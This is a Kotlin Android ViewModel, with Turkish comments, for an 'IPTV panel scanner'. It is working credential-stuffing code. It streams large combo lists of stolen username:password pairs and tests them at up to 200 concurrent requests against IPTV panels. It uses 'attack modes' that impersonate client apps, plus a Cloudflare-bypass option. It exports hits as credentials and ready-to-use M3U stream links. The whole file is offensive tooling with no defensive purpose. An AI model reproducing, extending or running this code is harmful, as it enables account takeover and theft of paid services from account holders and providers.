package com.alibaba.feature.panelscan

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.alibaba.domain.model.*
import com.alibaba.domain.service.PanelScanner
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import android.content.Context
import android.net.Uri
import java.io.InputStream
import javax.inject.Inject

/**
 * 🔥 ULTRA PANEL SCANNER STATE
 * Attack modları ve gelişmiş tarama özellikleri
 */
/**
 * Panel durumu - online/offline kontrolü için
 */
data class PanelStatus(
    val panel: PanelInfo,
    val isOnline: Boolean,
    val responseTimeMs: Long = 0,
    val errorMessage: String? = null
)

data class PanelScanState(
    val comboText: String = "",
    val customPanelUrl: String = "",
    val selectedPanels: List<PanelInfo> = emptyList(),
    val useEmbeddedPanels: Boolean = false,
    val scanning: Boolean = false,
    val progress: ScanProgress? = null,
    val results: List<PanelScanResult> = emptyList(),
    val errorMessage: String? = null,
    val comboLineCount: Int = 0,
    val showSaveDialog: Boolean = false,
    val savedFilePath: String? = null,
    // 🔥 Yeni özellikler
    val attackMode: AttackModeOption = AttackModeOption.ROTATION,
    val scanSpeed: ScanSpeed = ScanSpeed.FAST,
    val totalScanned: Int = 0,
    val scanStartTime: Long = 0,
    val estimatedTimeRemaining: String = "",
    // 📂 Dosya yükleme durumu
    val isLoadingFile: Boolean = false,
    val loadingProgress: Float = 0f,
    val loadingMessage: String = "",
    // 🚀 Panel ön-test durumu
    val isTestingPanels: Boolean = false,
    val panelStatuses: List<PanelStatus> = emptyList(),
    val onlinePanelCount: Int = 0,
    val offlinePanelCount: Int = 0
)

/**
 * Attack modları - den.py'den alınan
 */
enum class AttackModeOption(val displayName: String, val description: String) {
    ROTATION("🔄 Rotation", "Her istekte farklı mod kullanır - En güvenli"),
    RANDOM("🎲 Random", "Rastgele User-Agent kullanır"),
    TIVIMATE("📺 TiviMate", "TiviMate uygulaması gibi davranır"),
    OTT_NAVIGATOR("📡 OTT Navigator", "OTT Navigator uygulaması gibi davranır"),
    KODI("🎬 Kodi", "Kodi media player gibi davranır"),
    XCIPTV("📱 XCIPTV", "XCIPTV uygulaması gibi davranır"),
    STB_MAG("📦 STB/MAG", "MAG set-top box gibi davranır"),
    SMARTERS_PRO("💫 Smarters Pro", "IPTV Smarters Pro gibi davranır"),
    APPLE_TV("🍎 Apple TV", "Apple TV gibi davranır"),
    CLOUDBURST("☁️ Cloudburst", "Cloudflare bypass modu")
}

/**
 * Tarama hızı seçenekleri
 */
enum class ScanSpeed(val displayName: String, val delayMs: Long, val concurrency: Int) {
    SLOW("🐢 Yavaş (Güvenli)", 500L, 10),
    NORMAL("🚶 Normal", 200L, 25),
    FAST("🏃 Hızlı", 100L, 50),
    ULTRA("🚀 Ultra Hızlı", 50L, 100),
    AGGRESSIVE("⚡ Saldırgan", 0L, 200)
}

data class ScanProgress(
    val current: Int,
    val total: Int,
    val currentAccount: String = "",
    val validCount: Int = 0,
    val invalidCount: Int = 0,
    val errorCount: Int = 0,
    val speedPerSecond: Float = 0f
)

@HiltViewModel
class PanelScanViewModel @Inject constructor(
    private val panelScanner: PanelScanner
) : ViewModel() {

    private val _state = MutableStateFlow(PanelScanState())
    val state: StateFlow<PanelScanState> = _state.asStateFlow()
    
    private var scanJob: kotlinx.coroutines.Job? = null
    
    // 🔥 STREAMING YAKLAŞIMI - Dosyayı belleğe yüklemiyoruz!
    // Sadece URI ve satır sayısını saklıyoruz
    private var comboFileUri: Uri? = null
    private var appContext: Context? = null

    fun setComboText(text: String) {
        val lineCount = text.lines().count { it.contains(":") }
        _state.update { it.copy(comboText = text, comboLineCount = lineCount) }
    }
    
    // Artık hesapları bellekte TUTMUYORUZ - sadece küçük dosyalar için
    private var loadedAccounts: MutableList<String> = mutableListOf()
    private val MAX_MEMORY_ACCOUNTS = 50000 // 50K'dan fazla hesap varsa streaming kullan
    
    /**
     * 🔥 SIFIR BELLEK KULLANIMI - Sadece satır sayısını say!
     * 
     * Dosyayı belleğe YÜKLEMEZ, sadece:
     * 1. Satır sayısını sayar
     * 2. URI'yi saklar (tarama sırasında kullanılacak)
     * 
     * Tarama başladığında dosyadan STREAMING okuma yapılır
     */
    fun countLinesOnly(context: Context, uri: Uri, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
        // Context ve URI'yi sakla - tarama sırasında kullanılacak
        appContext = context.applicationContext
        comboFileUri = uri
        
        viewModelScope.launch(Dispatchers.IO) {
            try {
                _state.update { 
                    it.copy(
                        isLoadingFile = true,
                        loadingProgress = 0f,
                        loadingMessage = "� Hesap sayısı hesaplanıyor...",
                        errorMessage = null
                    ) 
                }
                
                loadedAccounts.clear()
                var lineCount = 0
                var bytesRead = 0L
                val buffer = CharArray(32768) // 32KB buffer - daha hızlı sayma
                
                val inputStream = context.contentResolver.openInputStream(uri)
                val reader = inputStream?.bufferedReader() ?: return@launch
                val lineBuilder = StringBuilder()
                
                // SADECE SAYMA - Belleğe ekleme yok!
                while (true) {
                    val charsRead = reader.read(buffer)
                    if (charsRead == -1) break
                    
                    bytesRead += charsRead
                    
                    for (i in 0 until charsRead) {
                        val char = buffer[i]
                        if (char == '\n' || char == '\r') {
                            if (lineBuilder.isNotEmpty()) {
                                val line = lineBuilder.toString()
                                if (line.contains(":") && !line.startsWith("#")) {
                                    lineCount++
                                    // Sadece küçük dosyalar için belleğe al
                                    if (lineCount <= MAX_MEMORY_ACCOUNTS) {
                                        loadedAccounts.add(line)
                                    }
                                }
                                lineBuilder.clear()
                            }
                        } else {
                            lineBuilder.append(char)
                        }
                    }
                    
                    // Her 10000 satırda bir UI güncelle
                    if (lineCount % 10000 == 0 && lineCount > 0) {
                        val progress = if (fileSize > 0) (bytesRead.toFloat() / fileSize).coerceIn(0f, 1f) else 0f
                        _state.update { 
                            it.copy(
                                loadingProgress = progress,
                                loadingMessage = "📊 $lineCount hesap sayıldı...",
                                comboLineCount = lineCount
                            ) 
                        }
                        kotlinx.coroutines.yield()
                    }
                }
                
                // Son satır
                if (lineBuilder.isNotEmpty()) {
                    val line = lineBuilder.toString()
                    if (line.contains(":") && !line.startsWith("#")) {
                        lineCount++
                        if (lineCount <= MAX_MEMORY_ACCOUNTS) {
                            loadedAccounts.add(line)
                        }
                    }
                }
                
                reader.close()
                
                val useStreaming = lineCount > MAX_MEMORY_ACCOUNTS
                _state.update { 
                    it.copy(
                        comboText = if (useStreaming) "[STREAMING: $lineCount hesap - tarama sırasında okunacak]" else "",
                        comboLineCount = lineCount,
                        isLoadingFile = false,
                        loadingProgress = 1f,
                        loadingMessage = if (useStreaming) 
                            "✅ $lineCount hesap bulundu (Streaming mod aktif)" 
                        else 
                            "✅ $lineCount hesap yüklendi"
                    ) 
                }
                
                onComplete(lineCount)
                
            } catch (e: Exception) {
                _state.update { 
                    it.copy(
                        isLoadingFile = false,
                        errorMessage = "❌ Dosya okuma hatası: ${e.message}"
                    ) 
                }
            }
        }
    }
    
    // Eski fonksiyon - geriye uyumluluk için
    fun loadComboFromStream(inputStream: InputStream, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
        // Bu artık kullanılmayacak, ama eski kod için bırakıyoruz
        onComplete(0)
    }
    
    /**
     * Yüklenen hesapları al (tarama için)
     */
    fun getLoadedAccounts(): List<String> {
        return if (loadedAccounts.isNotEmpty()) {
            loadedAccounts.toList()
        } else {
            _state.value.comboText.lines().filter { it.contains(":") }
        }
    }
    
    /**
     * Combo temizle
     */
    fun clearCombo() {
        loadedAccounts.clear()
        _state.update { 
            it.copy(
                comboText = "",
                comboLineCount = 0
            ) 
        }
    }
    
    /**
     * Attack modu değiştir
     * Seçilen mod tarama sırasında HTTP headers'a yansır
     */
    fun setAttackMode(mode: AttackModeOption) {
        _state.update { it.copy(attackMode = mode) }
    }
    
    /**
     * Tarama hızı değiştir
     */
    fun setScanSpeed(speed: ScanSpeed) {
        _state.update { it.copy(scanSpeed = speed) }
    }
    
    fun setCustomPanelUrl(url: String) {
        _state.update { it.copy(customPanelUrl = url) }
    }
    
    fun parseAndAddCustomPanel() {
        val url = _state.value.customPanelUrl.trim()
        if (url.isBlank()) return
        
        try {
            // URL'den host ve port çıkar
            val cleanUrl = url.removePrefix("http://").removePrefix("https://")
            val parts = cleanUrl.split(":")
            val host = parts[0].split("/")[0]
            val port = if (parts.size > 1) {
                parts[1].split("/")[0].toIntOrNull() ?: 80
            } else 80
            
            val panel = PanelInfo(host, port, isEmbedded = false)
            _state.update { 
                it.copy(
                    selectedPanels = it.selectedPanels + panel,
                    customPanelUrl = ""  // Temizle
                ) 
            }
        } catch (e: Exception) {
            _state.update { it.copy(errorMessage = "Geçersiz panel URL: $url") }
        }
    }
    
    fun clearCustomPanels() {
        _state.update { it.copy(selectedPanels = emptyList()) }
    }

    /**
     * 🔥 Panel URL'lerini metinden ayıkla
     * Otomatik taramadaki gibi metin ver, panelleri ayıkla
     */
    fun extractPanelsFromText(text: String) {
        val panelRegex = Regex("""(?:https?://)?([a-zA-Z0-9.-]+):(\d+)""")
        val newPanels = mutableListOf<PanelInfo>()
        
        panelRegex.findAll(text).forEach { match ->
            val host = match.groupValues[1]
            val port = match.groupValues[2].toIntOrNull() ?: 8080
            val panel = PanelInfo(host, port, isEmbedded = false)
            if (panel !in newPanels && panel !in _state.value.selectedPanels) {
                newPanels.add(panel)
            }
        }
        
        if (newPanels.isNotEmpty()) {
            _state.update { 
                it.copy(
                    selectedPanels = it.selectedPanels + newPanels,
                    customPanelUrl = "" // Temizle
                )
            }
        }
    }
    
    /**
     * Sonuçların M3U linklerini kopyalamak için al
     */
    fun getM3ULinks(): String {
        return _state.value.results.joinToString("\n") { result ->
            "http://${result.panel.fullAddress}/get.php?username=${result.account.username}&password=${result.account.password}&type=m3u_plus"
        }
    }

    fun addCustomPanel(host: String, port: Int) {
        val panel = PanelInfo(host, port, isEmbedded = false)
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels + panel) 
        }
    }

    fun removePanel(panel: PanelInfo) {
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels.filter { p -> p != panel }) 
        }
    }
    
    fun stopScan() {
        scanJob?.cancel()
        _state.update { 
            it.copy(
                scanning = false,
                isTestingPanels = false,
                showSaveDialog = it.results.isNotEmpty()
            ) 
        }
    }
    
    fun dismissSaveDialog() {
        _state.update { it.copy(showSaveDialog = false) }
    }
    
    /**
     * 🚀 PANEL ÖN-TEST - Taramadan önce panellerin online olup olmadığını kontrol et
     * Sadece online panelleri taramaya sok - zaman ve kaynak tasarrufu!
     */
    private suspend fun testPanelsOnline(panels: List<PanelInfo>): List<PanelInfo> {
        if (panels.isEmpty()) return emptyList()
        
        _state.update { 
            it.copy(
                isTestingPanels = true,
                loadingMessage = "🔍 Paneller test ediliyor...",
                panelStatuses = emptyList()
            )
        }
        
        val results = mutableListOf<PanelStatus>()
        val onlinePanels = mutableListOf<PanelInfo>()
        
        withContext(Dispatchers.IO) {
            val semaphore = Semaphore(20) // 20 paralel test
            
            val jobs = panels.map { panel ->
                async {
                    semaphore.withPermit {
                        val startTime = System.currentTimeMillis()
                        try {
                            // Panel'e basit bir bağlantı testi yap
                            val url = java.net.URL("http://${panel.fullAddress}/player_api.php")
                            val connection = url.openConnection() as java.net.HttpURLConnection
                            connection.connectTimeout = 5000
                            connection.readTimeout = 5000
                            connection.requestMethod = "HEAD"
                            
                            val responseCode = connection.responseCode
                            val responseTime = System.currentTimeMillis() - startTime
                            connection.disconnect()
                            
                            val isOnline = responseCode in 200..499 // 4xx de panel var demek
                            
                            PanelStatus(
                                panel = panel,
                                isOnline = isOnline,
                                responseTimeMs = responseTime
                            )
                        } catch (e: Exception) {
                            PanelStatus(
                                panel = panel,
                                isOnline = false,
                                errorMessage = e.message?.take(50)
                            )
                        }
                    }
                }
            }
            
            jobs.forEachIndexed { index, deferred ->
                val status = deferred.await()
                results.add(status)
                if (status.isOnline) {
                    onlinePanels.add(status.panel)
                }
                
                // UI güncelle
                _state.update {
                    it.copy(
                        loadingMessage = "🔍 Panel testi: ${index + 1}/${panels.size} (${onlinePanels.size} online)",
                        panelStatuses = results.toList(),
                        onlinePanelCount = onlinePanels.size,
                        offlinePanelCount = results.size - onlinePanels.size
                    )
                }
            }
        }
        
        _state.update { 
            it.copy(
                isTestingPanels = false,
                loadingMessage = "✅ ${onlinePanels.size}/${panels.size} panel online"
            )
        }
        
        return onlinePanels
    }
    
    fun getResultsAsText(): String {
        val results = _state.value.results
        val sb = StringBuilder()
        sb.appendLine("=== IPTV Panel Tarama Sonuçları ===")
        sb.appendLine("Tarih: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
        sb.appendLine("Bulunan Hesap Sayısı: ${results.size}")
        sb.appendLine()
        
        results.forEach { result ->
            sb.appendLine("─".repeat(50))
            sb.appendLine("Kullanıcı: ${result.account.username}")
            sb.appendLine("Şifre: ${result.account.password}")
            sb.appendLine("Panel: ${result.panel.fullAddress}")
            result.userInfo?.let { info ->
                sb.appendLine("Bitiş: ${info.expDate ?: "Sınırsız"}")
                sb.appendLine("Bağlantı: ${info.activeCons}/${info.maxConnections}")
                sb.appendLine("Durum: ${info.status}")
            }
            sb.appendLine("M3U: http://${result.panel.fullAddress}/get.php?username=${result.account.username}&password=${result.account.password}&type=m3u_plus")
            sb.appendLine()
        }
        
        return sb.toString()
    }

    /**
     * 🔥 STREAMING TARAMA - Sınırsız hesap desteği!
     * 
     * Küçük dosyalar: Bellekteki hesapları kullan
     * Büyük dosyalar: Dosyadan chunk chunk oku ve tara
     */
    fun startScan() {
        val currentState = _state.value
        
        // Combo kontrolü
        if (currentState.comboLineCount == 0 && loadedAccounts.isEmpty()) {
            _state.update { it.copy(errorMessage = "Lütfen combo dosyası seçin") }
            return
        }
        
        if (currentState.selectedPanels.isEmpty()) {
            _state.update { it.copy(errorMessage = "Lütfen panel URL'si girin") }
            return
        }

        // Streaming mi kullanılacak?
        val useStreaming = currentState.comboLineCount > MAX_MEMORY_ACCOUNTS && comboFileUri != null && appContext != null

        scanJob = viewModelScope.launch {
            val startTime = System.currentTimeMillis()
            
            _state.update { 
                it.copy(
                    scanning = true, 
                    errorMessage = null,
                    results = emptyList(),
                    progress = null,
                    scanStartTime = startTime,
                    panelStatuses = emptyList()
                ) 
            }

            try {
                // 🚀 PANEL ÖN-TEST - Sadece online panelleri tara!
                val allPanels = currentState.selectedPanels.toList()
                val onlinePanels = testPanelsOnline(allPanels)
                
                if (onlinePanels.isEmpty()) {
                    _state.update { 
                        it.copy(
                            scanning = false,
                            errorMessage = "❌ Hiçbir panel online değil! (${allPanels.size} panel test edildi)"
                        ) 
                    }
                    return@launch
                }

                val results = mutableListOf<PanelScanResult>()
                var validCount = 0
                var invalidCount = 0
                var errorCount = 0
                var totalScanned = 0
                val totalAccounts = currentState.comboLineCount
                val delayMs = currentState.scanSpeed.delayMs
                val concurrency = currentState.scanSpeed.concurrency

                withContext(Dispatchers.IO) {
                    val semaphore = Semaphore(concurrency)
                    
                    if (useStreaming) {
                        // 🔥 STREAMING MODU - Dosyadan chunk chunk oku
                        val ctx = appContext!!
                        val uri = comboFileUri!!
                        val chunkSize = 1000 // Her seferde 1000 hesap oku
                        
                        val inputStream = ctx.contentResolver.openInputStream(uri)
                        val reader = inputStream?.bufferedReader() ?: return@withContext
                        
                        val accountBatch = mutableListOf<ComboAccount>()
                        var line: String?
                        
                        while (reader.readLine().also { line = it } != null) {
                            val currentLine = line ?: continue
                            if (currentLine.contains(":") && !currentLine.startsWith("#")) {
                                val parts = currentLine.split(":")
                                if (parts.size >= 2) {
                                    accountBatch.add(ComboAccount(parts[0], parts[1]))
                                }
                            }
                            
                            // Batch dolduğunda tara
                            if (accountBatch.size >= chunkSize) {
                                // Bu batch'i tara
                                val batchResults = scanBatch(
                                    accounts = accountBatch.toList(),
                                    panels = onlinePanels,
                                    semaphore = semaphore,
                                    delayMs = delayMs,
                                    startTime = startTime,
                                    totalAccounts = totalAccounts,
                                    currentOffset = totalScanned,
                                    onProgress = { scanned, valid, invalid, error ->
                                        totalScanned = scanned
                                        validCount = valid
                                        invalidCount = invalid
                                        errorCount = error
                                    },
                                    onResult = { result ->
                                        synchronized(results) {
                                            results.add(result)
                                            _state.update { s -> s.copy(results = results.toList()) }
                                        }
                                    }
                                )
                                
                                accountBatch.clear()
                                kotlinx.coroutines.yield()
                            }
                        }
                        
                        // Kalan hesapları tara
                        if (accountBatch.isNotEmpty()) {
                            scanBatch(
                                accounts = accountBatch.toList(),
                                panels = onlinePanels,
                                semaphore = semaphore,
                                delayMs = delayMs,
                                startTime = startTime,
                                totalAccounts = totalAccounts,
                                currentOffset = totalScanned,
                                onProgress = { scanned, valid, invalid, error ->
                                    totalScanned = scanned
                                    validCount = valid
                                    invalidCount = invalid
                                    errorCount = error
                                },
                                onResult = { result ->
                                    synchronized(results) {
                                        results.add(result)
                                        _state.update { s -> s.copy(results = results.toList()) }
                                    }
                                }
                            )
                        }
                        
                        reader.close()
                        
                    } else {
                        // Normal mod - bellekteki hesapları kullan
                        val accounts = if (loadedAccounts.isNotEmpty()) {
                            loadedAccounts.map { line ->
                                val parts = line.split(":")
                                ComboAccount(parts[0], parts.getOrElse(1) { "" })
                            }
                        } else {
                            panelScanner.parseComboFile(currentState.comboText)
                        }
                        
                        if (accounts.isEmpty()) {
                            _state.update { 
                                it.copy(
                                    scanning = false,
                                    errorMessage = "Geçerli hesap bulunamadı"
                                ) 
                            }
                            return@withContext
                        }
                        
                        val totalScans = accounts.size * onlinePanels.size
                        var currentScan = 0
                        
                        val jobs = accounts.flatMap { account ->
                            onlinePanels.map { panel ->
                                async {
                                    semaphore.withPermit {
                                        try {
                                            val result = panelScanner.scanAccount(account, panel)
                                            
                                            synchronized(results) {
                                                currentScan++
                                                
                                                when (result.status) {
                                                    is ScanStatus.Valid -> {
                                                        validCount++
                                                        results.add(result)
                                                        _state.update { s -> s.copy(results = results.toList()) }
                                                    }
                                                    is ScanStatus.Invalid -> invalidCount++
                                                    is ScanStatus.Error -> errorCount++
                                                    is ScanStatus.Banned -> errorCount++
                                                    else -> {}
                                                }
                                                
                                                if (currentScan % 50 == 0 || currentScan == totalScans) {
                                                    val elapsed = (System.currentTimeMillis() - startTime) / 1000f
                                                    val speed = if (elapsed > 0) currentScan / elapsed else 0f
                                                    
                                                    _state.update { s -> 
                                                        s.copy(
                                                            progress = ScanProgress(
                                                                current = currentScan,
                                                                total = totalScans,
                                                                currentAccount = "${account.username}:***",
                                                                validCount = validCount,
                                                                invalidCount = invalidCount,
                                                                errorCount = errorCount,
                                                                speedPerSecond = speed
                                                            ),
                                                            totalScanned = currentScan
                                                        ) 
                                                    }
                                                }
                                            }
                                            
                                            if (delayMs > 0) delay(delayMs)
                                            result
                                        } catch (e: Exception) {
                                            synchronized(results) { errorCount++ }
                                            null
                                        }
                                    }
                                }
                            }
                        }
                        
                        jobs.awaitAll()
                        totalScanned = accounts.size
                    }
                }

                // Final update
                val totalTime = (System.currentTimeMillis() - startTime) / 1000f
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = results.isNotEmpty(),
                        progress = ScanProgress(
                            current = totalScanned * onlinePanels.size,
                            total = totalAccounts * onlinePanels.size,
                            validCount = validCount,
                            invalidCount = invalidCount,
                            errorCount = errorCount,
                            speedPerSecond = if (totalTime > 0) totalScanned / totalTime else 0f
                        )
                    ) 
                }

            } catch (e: kotlinx.coroutines.CancellationException) {
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = _state.value.results.isNotEmpty()
                    ) 
                }
            } catch (e: Exception) {
                _state.update { 
                    it.copy(
                        scanning = false,
                        errorMessage = "Hata: ${e.message}"
                    ) 
                }
            }
        }
    }
    
    /**
     * Batch tarama - chunk chunk hesapları tarar
     */
    private suspend fun scanBatch(
        accounts: List<ComboAccount>,
        panels: List<PanelInfo>,
        semaphore: Semaphore,
        delayMs: Long,
        startTime: Long,
        totalAccounts: Int,
        currentOffset: Int,
        onProgress: (scanned: Int, valid: Int, invalid: Int, error: Int) -> Unit,
        onResult: (PanelScanResult) -> Unit
    ) {
        var validCount = 0
        var invalidCount = 0
        var errorCount = 0
        var scanned = currentOffset
        
        val jobs = accounts.flatMap { account ->
            panels.map { panel ->
                viewModelScope.async(Dispatchers.IO) {
                    semaphore.withPermit {
                        try {
                            val result = panelScanner.scanAccount(account, panel)
                            
                            synchronized(this) {
                                scanned++
                                
                                when (result.status) {
                                    is ScanStatus.Valid -> {
                                        validCount++
                                        onResult(result)
                                    }
                                    is ScanStatus.Invalid -> invalidCount++
                                    is ScanStatus.Error -> errorCount++
                                    is ScanStatus.Banned -> errorCount++
                                    else -> {}
                                }
                                
                                if (scanned % 100 == 0) {
                                    val elapsed = (System.currentTimeMillis() - startTime) / 1000f
                                    val speed = if (elapsed > 0) scanned / elapsed else 0f
                                    
                                    _state.update { s -> 
                                        s.copy(
                                            progress = ScanProgress(
                                                current = scanned * panels.size,
                                                total = totalAccounts * panels.size,
                                                currentAccount = "${account.username}:***",
                                                validCount = validCount,
                                                invalidCount = invalidCount,
                                                errorCount = errorCount,
                                                speedPerSecond = speed
                                            ),
                                            totalScanned = scanned
                                        ) 
                                    }
                                    
                                    onProgress(scanned, validCount, invalidCount, errorCount)
                                }
                            }
                            
                            if (delayMs > 0) delay(delayMs)
                            result
                        } catch (e: Exception) {
                            synchronized(this) { errorCount++ }
                            null
                        }
                    }
                }
            }
        }
        
        jobs.awaitAll()
        onProgress(scanned, validCount, invalidCount, errorCount)
    }

    fun clearResults() {
        _state.update { 
            it.copy(
                results = emptyList(),
                progress = null,
                errorMessage = null
            ) 
        }
    }

    fun clearError() {
        _state.update { it.copy(errorMessage = null) }
    }
}
